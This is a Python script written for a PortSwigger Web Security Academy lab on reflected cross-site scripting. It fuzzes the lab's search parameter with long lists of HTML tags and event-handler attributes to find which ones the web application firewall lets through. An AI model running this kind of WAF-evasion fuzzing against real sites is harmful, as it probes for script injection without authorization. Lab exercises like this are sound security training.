# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked

import requests
import concurrent.futures

url=f'https://0aae0065039aba2881b402c9005600f8.h1-web-security-academy.net/'

sessions = {"session": "xCmrl6STKXYwQezDq3kK7pDkB6tPiPed"}

def find_tag(tag):
    payload = f"' <{tag}>"
    para_send = {
        "search":payload
    }
    response = requests.get(url,params=para_send,cookies=sessions)
    if response.status_code==200 :
        return tag
    return None

def find_event(tag,event):
    payload = f"' </h1> <{tag} {event}=1>"
    para_send = {
        "search":payload
    }
    response = requests.get(url,params=para_send,cookies=sessions)
    if response.status_code==200:
        return event
    return None
        

tags_list = [
    "a", "abbr", "acronym", "address", "animate", "animatemotion", 
    "animatetransform", "applet", "area", "article", "aside", "audio", 
    "b", "base", "bdi", "bdo", "big", "blink", "blockquote", "body", 
    "br", "button", "canvas", "caption", "center", "cite", "code", 
    "col", "colgroup", "command", "content", "data", "datalist", "dd", 
    "del", "details", "dfn", "dialog", "dir", "div", "dl", "dt", 
    "element", "em", "embed", "fieldset", "figcaption", "figure", "font", 
    "footer", "form", "frame", "frameset", "h1", "head", "header", 
    "hgroup", "hr", "html", "i", "iframe", "image", "img", "input", 
    "ins", "kbd", "keygen", "label", "legend", "li", "link", "listing", 
    "main", "map", "mark", "marquee", "menu", "menuitem", "meta", "meter", 
    "multicol", "nav", "nextid", "nobr", "noembed", "noframes", "noscript", 
    "object", "ol", "optgroup", "option", "output", "p", "param", "picture", 
    "plaintext", "pre", "progress", "q", "rb", "rp", "rt", "rtc", "ruby", 
    "s", "samp", "script", "section", "select", "set", "shadow", "slot", 
    "small", "source", "spacer", "span", "strike", "strong", "style", 
    "sub", "summary", "sup", "svg", "table", "tbody", "td", "template", 
    "textarea", "tfoot", "th", "thead", "time", "title", "tr", "track", 
    "tt", "u", "ul", "var", "video", "wbr", "xmp", "xss"
]

events_list = [
    "onafterprint", "onanimationcancel", "onanimationend", "onanimationiteration", 
    "onanimationstart", "onauxclick", "onbeforecopy", "onbeforecut", "onbeforeinput", 
    "onbeforematch", "onbeforepaste", "onbeforeprint", "onbeforetoggle", "onbeforeunload", 
    "onbegin", "onblur", "oncancel", "oncanplay", "oncanplaythrough", "onchange", 
    "onclick", "onclose", "oncommand", "oncontentvisibilityautostatechange", 
    "oncontentvisibilityautostatechange()", "oncontextmenu", "oncopy", "oncuechange", 
    "oncut", "ondblclick", "ondrag", "ondragend", "ondragenter", "ondragexit", 
    "ondragleave", "ondragover", "ondragstart", "ondrop", "ondurationchange", "onend", 
    "onended", "onerror", "onfocus", "onfocus()", "onfocusin", "onfocusout", 
    "onformdata", "onfullscreenchange", "ongesturechange", "ongestureend", "ongesturestart", 
    "ongotpointercapture", "onhashchange", "oninput", "oninvalid", "onkeydown", 
    "onkeypress", "onkeyup", "onload", "onloadeddata", "onloadedmetadata", "onloadstart", 
    "onlocation", "onlostpointercapture", "onmessage", "onmousedown", "onmouseenter", 
    "onmouseleave", "onmousemove", "onmouseout", "onmouseover", "onmouseup", 
    "onmousewheel", "onmozfullscreenchange", "onpagehide", "onpagereveal", "onpageshow", 
    "onpageswap", "onpaste", "onpause", "onplay", "onplaying", "onpointercancel", 
    "onpointerdown", "onpointerenter", "onpointerleave", "onpointermove", "onpointerout", 
    "onpointerover", "onpointerrawupdate", "onpointerup", "onpopstate", "onprogress", 
    "onpromptaction", "onpromptdismiss", "onratechange", "onrepeat", "onreset", 
    "onresize", "onscroll", "onscrollend", "onscrollsnapchange", "onscrollsnapchanging", 
    "onsearch", "onsecuritypolicyviolation", "onseeked", "onseeking", "onselect", 
    "onselectionchange", "onselectstart", "onslotchange", "onsubmit", "onsuspend", 
    "ontimeupdate", "ontoggle", "ontoggle(popover)", "ontouchcancel", "ontouchend", 
    "ontouchmove", "ontouchstart", "ontransitioncancel", "ontransitionend", "ontransitionrun", 
    "ontransitionstart", "onunhandledrejection", "onunload", "onvalidationstatuschange", 
    "onvolumechange", "onwaiting", "onwaiting(loop)", "onwebkitanimationend", 
    "onwebkitanimationiteration", "onwebkitanimationstart", "onwebkitfullscreenchange", 
    "onwebkitmouseforcechanged", "onwebkitmouseforcedown", "onwebkitmouseforceup", 
    "onwebkitmouseforcewillbegin", "onwebkitplaybacktargetavailabilitychanged", 
    "onwebkitpresentationmodechanged", "onwebkittransitionend", "onwebkitwillrevealbottom", 
    "onwheel"
]

allowed_tag = set()

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor :
    outcome = [executor.submit(find_tag,tag) for tag in tags_list]

    for output in concurrent.futures.as_completed(outcome):
        result=output.result()
        if result is not None:
            allowed_tag.add(result)

        
for i in allowed_tag:
    print("[!!!] WAF authorized",i)

allowed_event = set()

with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
    outcome = [executor.submit(find_event,tag,event) for tag in allowed_tag for event in events_list]

    for output in concurrent.futures.as_completed(outcome):
        result=output.result()
        if result is not None:
            allowed_event.add(result)

for i in allowed_event:
    print("WAF authorized",i)
            



    
        
